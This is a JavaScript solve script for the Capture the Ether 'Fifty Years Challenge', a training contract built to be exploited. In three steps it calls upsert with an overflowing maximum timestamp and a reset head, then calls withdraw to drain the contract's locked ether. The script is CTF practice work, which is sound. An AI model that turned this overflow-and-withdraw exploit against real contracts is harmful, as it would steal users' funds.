/*
 * @Author: Soingjeang
 * @Date: 2022-07-21 14:49:07
 * @LastEditors: SoingJeang
 * @LastEditTime: 2022-07-26 22:59:57
 * @FilePath: \CapTheEther\src\math\3_6_FiftyYearsChallenge.js
 */
const { timeStamp } = require('console');
const ethers = require('ethers');
const fs = require('fs');
const utils = require('../utils')
const abiFile = './build/contracts/FiftyYearsChallenge.json'; // fill
const ctfAbi = './build/contracts/CTFFiftyYearsChallenge.json'; // fill
const secrteFile = "../.secret"
const mnemonicFile = "../iBpnG3uuUwI.csv"
const ctfaddress = "0x78365F9669b4aD04a3e3b9261cA018524405ca44" // fill
const contractChallangeAddress = "0x2C577b88bC18e36bc3f81648A3C126f46dDFE9ea" // fill
const localChallange = "0x9f3Bf0945a3CCB2420DEdee77A68e6bAad90b7b2" //fill
const localctf = "0xEf01aAa2c70A518390Cf69C01Df5582E8a3663Ac" //fill

var localtest = 0  //fill

let provider = utils.getNetProvider("3", localtest)


async function guess(contractCtf, contractChallenge) {
    // method from analysis
    // use upsert insert an new contribution to Add  value more than 2 (maybe 3)
    // in 3 block to withdraw values
    var nBlock = 1
    upsert = 0
    comp = await contractChallenge.isComplete()
    console.log("complete: " + comp)
    if (!comp) {
        let max256 = await contractCtf.getMaxuint256()
        let maxBig = ethers.BigNumber.from(max256)

        // let length = await contractChallenge.getLength()
        // console.log("length: " + length)
        if (upsert == 1) {
            // step first to set timestamp by max - 1 days, and size 2
            let TS = await contractCtf.getTS()
            let TSAfter = await contractCtf.getTSAfter(50, 1)
            console.log("TS: " + TS + "  TSAfter: " + TSAfter + "\n --------------------------")

            let maxTime = await contractCtf.getMaxTimeStamp(0, 1)
            let maxTimeBig = ethers.BigNumber.from(maxTime)

            // let newTimeStamp = await contractCtf.getTimaStampAfter(50, upsert)
            // console.log("newTimeStamp: " + newTimeStamp)
            await contractChallenge.upsert(100, maxTimeBig, {value: nBlock})
            console.log("upset new value with Max Time: " )

            // let owner = await contractChallenge.getOwnne()
            // console.log("Owner : " + owner)
            // let head = await contractChallenge.getHead()
            // console.log("Head : " + head)
        }
        else if (upsert == 2){
            // step second to set head 0 and add ether right
            // let newTimeStamp = await contractCtf.getTimaStampAfter(50, upsert)
            // console.log("newTimeStamp: " + newTimeStamp)
            // 重新设置 head = 0, len = nBlock + 2
            await contractChallenge.upsert(100, 0, {value: nBlock})
            console.log("upset new value : ")
        }
        else {
            // step third to back ether
            await contractChallenge.withdraw(nBlock)
        }
    }

    console.log("uess me success")
}

async function doCapture() {

    let wallet = utils.getMnemonicWallet(mnemonicFile, localtest)

    var contractChall
    var contrateCtf
    if (localtest) {
        contractChall = utils.getContract(wallet, abiFile, localChallange, provider)
        contrateCtf = utils.getContract(wallet, ctfAbi, localctf, provider)
    }
    else {
        contractChall = utils.getContract(wallet, abiFile, contractChallangeAddress, provider)
        contrateCtf = utils.getContract(wallet, ctfAbi, ctfaddress, provider)
    }
    
    guess(contrateCtf, contractChall)
}

doCapture()